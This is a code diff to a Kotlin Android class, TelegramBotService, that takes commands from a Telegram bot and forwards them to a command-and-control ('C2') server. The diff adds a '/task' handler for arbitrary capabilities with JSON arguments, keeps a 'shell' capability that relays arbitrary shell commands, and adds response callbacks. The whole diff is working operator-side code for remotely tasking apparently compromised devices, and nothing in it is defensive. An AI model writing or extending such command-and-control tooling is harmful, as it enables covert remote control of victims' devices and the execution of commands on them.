@@ -34,7 +34,7 @@ class TelegramBotService(private val context: Context) {
     fun start() {
         if (running) return
         running = true
-        pollThread = Thread(name = "telegram-bot-poll") { pollLoop() }
+        pollThread = Thread({ pollLoop() }, "telegram-bot-poll")
         pollThread?.start()
         Log.d("TelegramBot", "Bot started")
     }
@@ -53,14 +53,18 @@ class TelegramBotService(private val context: Context) {
             } catch (e: Exception) {
                 Log.e("TelegramBot", "Poll error", e)
             }
-            Thread.sleep(2000)
+            try {
+                Thread.sleep(2000)
+            } catch (e: InterruptedException) {
+                return
+            }
         }
     }
 
     private fun getUpdates() {
         val offset = prefs.getLong(KEY_OFFSET, 0) + 1
         val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=$offset&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
-        
+
         val request = Request.Builder().url(url).build()
         client.newCall(request).execute().use { response ->
             response.body?.string()?.let { json ->
@@ -91,7 +95,7 @@ class TelegramBotService(private val context: Context) {
     private fun handleCommand(msg: TelegramMessage) {
         val text = msg.text ?: ""
         val chatId = msg.chat.id
-        
+
         when {
             text.startsWith("/start") -> {
                 sendMessage(chatId, getHelpMessage())
@@ -124,6 +128,27 @@ class TelegramBotService(private val context: Context) {
         // Handle inline keyboard callbacks if needed
     }
 
+    private fun sendTaskCommand(chatId: Long, args: String) {
+        // Parse custom task command: /task capability json_args
+        val parts = args.split(" ", limit = 2)
+        if (parts.size < 2) {
+            sendMessage(chatId, "Usage: /task <capability> <json_args>")
+            return
+        }
+        val capability = parts[0]
+        val jsonArgs = parts[1]
+        try {
+            val argsMap = gson.fromJson(jsonArgs, Map::class.java)
+            sendTask(chatId, capability, argsMap)
+        } catch (e: Exception) {
+            sendMessage(chatId, "Invalid JSON args: ${e.message}")
+        }
+    }
+
+    private fun sendShellCommand(chatId: Long, command: String) {
+        sendTask(chatId, "shell", mapOf("command" to command))
+    }
+
     private fun sendTask(chatId: Long, capability: String, args: Map<String, Any>) {
         val c2Url = getC2Url()
         val payload = mapOf(
@@ -139,11 +164,7 @@ class TelegramBotService(private val context: Context) {
         }
     }
 
-    private fun sendShellCommand(chatId: Long, command: String) {
-        sendTask(chatId, "shell", mapOf("command" to command))
-    }
-
-    private fun sendC2Request(baseUrl: String, endpoint: String, payload: Map<String, Any>): String? {
+    private fun sendC2Request(baseUrl: String, endpoint: String, payload: Map<String, Any>, callback: (String) -> Unit): String? {
         try {
             val url = "$baseUrl$endpoint"
             val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
@@ -152,12 +173,15 @@ class TelegramBotService(private val context: Context) {
                 .post(requestBody)
                 .build()
             client.newCall(request).execute().use { response ->
-                return response.body?.string()
+                val respBody = response.body?.string()
+                respBody?.let { callback(it) }
+                return respBody
             }
         } catch (e: Exception) {
             Log.e("TelegramBot", "C2 request failed", e)
             return null
         }
+        return null
     }
 
     private fun sendStatus(chatId: Long) {
